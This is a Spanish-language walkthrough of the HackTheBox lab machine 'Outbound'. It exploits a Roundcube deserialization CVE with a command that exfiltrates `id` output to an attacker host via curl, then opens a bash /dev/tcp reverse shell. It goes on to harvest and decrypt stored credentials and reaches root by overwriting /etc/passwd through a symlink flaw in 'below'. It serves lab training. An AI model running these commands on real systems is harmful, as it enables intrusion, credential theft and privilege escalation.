---
icon: flag
---

# Outbound HackTheBox (Easy)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 06:33 EDT
Nmap scan report for 10.10.11.77
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.94 seconds
```

Veremos varios puertos interesantes, entre ellos vemos el puerto `80` que suele alojar una pagina web, pero vemos que nos redirije a un `subdominio` directamente llamado `mail.outbound.htb` por lo que vamos añadirlo a nuestro archivo `hosts` de esta forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>            mail.outbound.htb
```

Lo guardamos y entramos a dicho `subdominio` para ver que vemos:

```
URL = http://mail.outbound.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-24 123651.png" alt=""><figcaption></figcaption></figure>

Veremos un `login`, si leemos la informacion de la maquina de `HTB` nos deja unas credenciales para el `pentesting`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-24 123728.png" alt=""><figcaption></figcaption></figure>

Por lo que vamos a probarlas en dicho `login`:

```
User: tyler
Pass: LhKL1o9Nm3X2
```

Si las probamos veremos que funcionan y estaremos dentro:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-24 123819.png" alt=""><figcaption></figcaption></figure>

Vamos a comprobar si esta version de `software` es vulnerable, abajo a la izquierda veremos un boton llamado `About`, si le damos veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-24 124345.png" alt=""><figcaption></figcaption></figure>

Vemos que es de la version `1.6.10`, ahora si buscamos alguna `vulnerabilidad` veremos que si existe una con un `CVE` asociado llamado `CVE-2025-49113`, en la siguiente pagina de `exploit` veremos que nos da un `PoC` el cual utilizaremos de esta forma:

URL = [RoundCube Exploit CVE-2025-49113](https://github.com/hakaioffsec/CVE-2025-49113-exploit/tree/main)

```shell
php exploit.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'curl http://<IP_ATTACKER>:8000/$(id | base64 -w0)'
```

Antes de darle a ejecutar vamos abrir un servidor de `python3` para que nos llegue dicha informacion del comando en `Base64`.

```shell
python3 -m http.server 80
```

Ahora si ejecutamos el comando de antes y volvemos a donde tenemos el servidor de `python3` veremos lo siguiente:

> INFO COMANDO CVE

```
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!
```

> INFO SERVIDOR PYTHON3

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.77 - - [24/Sep/2025 06:51:17] code 404, message File not found
10.10.11.77 - - [24/Sep/2025 06:51:17] "GET /dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK HTTP/1.1" 404 -
```

Veremos que nos llego bien este `Base64`, si lo decodificamos veremos lo siguiente:

```shell
echo 'dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK' | base64 -d
```

Info:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Vemos que esta funcionando, por lo que vamos a realizar una `reverse shell` de esta forma, pero antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora vamos a ejecutar esto:

```shell
php exploit.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'bash -c "bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1"'
```

Info:

```
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```

Si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.98] from (UNKNOWN) [10.10.11.77] 36892
bash: cannot set terminal process group (247): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/$ whoami
whoami
www-data
```

Vemos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user jacob

Si vamos a este directorio:

```
/var/www/html/roundcube/config
```

Veremos varios archivos interesantes, entre ellos uno llamado `config.inc.php`, que si lo leemos veremos esta linea interesante:

```
................................<RESTO DE CODIGO>..................................
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
................................<RESTO DE CODIGO>..................................
```

Vemos unas credenciales de `mysql`, si los probamos con los usuarios a nivel de sistema por `SSH` no vamos a tener suerte, si nos conectamos por `mysql` veremos que si nos dejara:

```shell
mysql -h localhost -u roundcube -pRCDBPass2025
```

Con esto estaremos dentro de la `DDBB`, si investigamos un poco encontraremos esta tabla de usuarios con contraseñas de dichos usuarios:

```mysql
show databases;
```

Info:

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
2 rows in set (0.001 sec)
```

Ahora listamos las tablas:

```mysql
show tables;
```

Info:

```
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.001 sec)
```

Ahora si listamos la tabla `users`.

```mysql
select * from users;
```

Info:

```
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                               |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}         |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}         |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-09-24 10:56:18 | 2025-06-11 07:51:22 |                    1 | en_US    | a:2:{s:11:"client_hash";s:16:"n0DgbMd9bkHQA3zB";i:0;b:0;} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
3 rows in set (0.000 sec)
```

Si los probamos por `SSH` a nivel de sistema con todos los usuarios y con todas las contraseñas, veremos que no funciona, por lo que no nos sirve de nada.

Siguiendo investigando en las tablas veremos otra interesante llamada `session`, si listamos para ver el contenido de dicha tabla veremos esto:

```mysql
select * from session;
```

Info:

```
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| sess_id                    | changed             | ip         | vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.001 sec)
```

Vemos que los datos de la sesion esta serializados en `Base64`, si lo decodificamos de esta forma, veremos esto:

```shell
echo 'bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUVfTElTVC1FWFRFTkRFfGI6MTtsaXN0X2F0dHJpYnxhOjY6e3M6NDoibmFtZSI7czo4OiJtZXNzYWdlcyI7czoyOiJpZCI7czoxMToibWVzc2FnZWxpc3QiO3M6NToiY2xhc3MiO3M6NDI6Imxpc3RpbmcgbWVzc2FnZWxpc3Qgc29ydGhlYWRlciBmaXhlZGhlYWRlciI7czoxNToiYXJpYS1sYWJlbGxlZGJ5IjtzOjIyOiJhcmlhLWxhYmVsLW1lc3NhZ2VsaXN0IjtzOjk6ImRhdGEtbGlzdCI7czoxMjoibWVzc2FnZV9saXN0IjtzOjE0OiJkYXRhLWxhYmVsLW1zZyI7czoxODoiVGhlIGxpc3QgaXMgZW1wdHkuIjt9dW5zZWVuX2NvdW50fGE6Mjp7czo1OiJJTkJPWCI7aToyO3M6NToiVHJhc2giO2k6MDt9Zm9sZGVyc3xhOjE6e3M6NToiSU5CT1giO2E6Mjp7czozOiJjbnQiO2k6MjtzOjY6Im1heHVpZCI7aTozO319bGlzdF9tb2Rfc2VxfHMyOiIxMCI7' | base64 -d
```

Info:

```
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAE_LIST-EXTENDE|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s2:"10";
```

Vemos que tenemos unas credenciales con una contraseña codificada.

```
User: jacob
Pass: L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
```

Vemos que esto tiene toda la pinta de una encriptacion `DES-ECB`, si nosotros investigamos el archivo de antes llamado `config.inc.php`, veremos esta linea tambien:

```
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

De ahi deducimos el tipo de encriptacion, ya que tenemos la clave de `desencriptado` podremos utilizar `CiferChef` para poder decodificar todo esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-24 134555.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-24 134828.png" alt=""><figcaption></figcaption></figure>

Veremos que ha funcionado, con esto obtendremos una clave que sera `595mO8DmwGeD`, si la probamos con el usuario `jacob` a nivel local...

```shell
su jacob
```

Info:

```
jacob@mail:/var/www/html/roundcube$ whoami
jacob
```

Veremos que ha funcionado.

## Escalate user jacob (SSH)

Si leemos el `INBOX` del `email` del propio usuario `jacob` en esta ruta:

```
/home/jacob/mail/INBOX
```

Del archivo llamado `jacob`, veremos lo siguiente:

```
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
        id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler
.............................<RESTO DE MENSAJE>....................................
```

Vemos que tenemos una contraseña `gY4Wr3a1evp4` la cual podriamos probar por `SSH` a ver si funcionara de esta forma:

```shell
ssh jacob@<IP>
```

Metemos como contraseña `gY4Wr3a1evp4`...

```
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Sep 24 12:03:19 PM UTC 2025

  System load:  0.0               Processes:             276
  Usage of /:   76.4% of 6.73GB   Users logged in:       0
  Memory usage: 14%               IPv4 address for eth0: 10.10.11.77
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Mon Jul 14 16:40:57 2025 from 10.10.14.77
jacob@outbound:~$ whoami
jacob
```

Con esto veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
a76674d223c106062d66aea2d490a238
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

Vemos que podemos ejecutar el binario `below` junto con mas parametros como el usuario `root`, por lo que vamos a investigar que hacer este binario.

Si buscamos informacion sobre el `binario` veremos que hay una vulnerabilidad registrada como el `CVE-2025-27591`, si buscamos el `PoC` veremos el siguiente repositorio en el que lo ofrece:

URL = [Exploit PoC CVE-2025-27591](https://github.com/BridgerAlderson/CVE-2025-27591-PoC/blob/main/exploit.py)

Esta vulnerabilidad es una **escalación de privilegios local** en el servicio _Below_: el servicio crea/usa un directorio de logs con permisos demasiado abiertos (world-writable), permitiendo a un usuario local usar **symlinks** para forzar escrituras en archivos sensibles. Con esto podremos sobreescribir el archivo `/etc/passwd` para añadir un usuario con todos los privilegios y asi ser directamente `root` y despues lo elimina los archivos.

Vamos a ejecutar la herramienta de esta forma:

```shell
python3 exploit.py
```

Info:

```
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/attacker
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Sep 24 12:37:17.380 DEBG Starting up!
Sep 24 12:37:17.381 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01758672000: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Appending payload into /etc/passwd via symlink...
[+] Payload appended successfully.
[*] Attempting to switch to root shell via 'su attacker'...
root@outbound:/tmp# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
3efb1a8d02b0e3c4258b8dfb6cf2be93
```
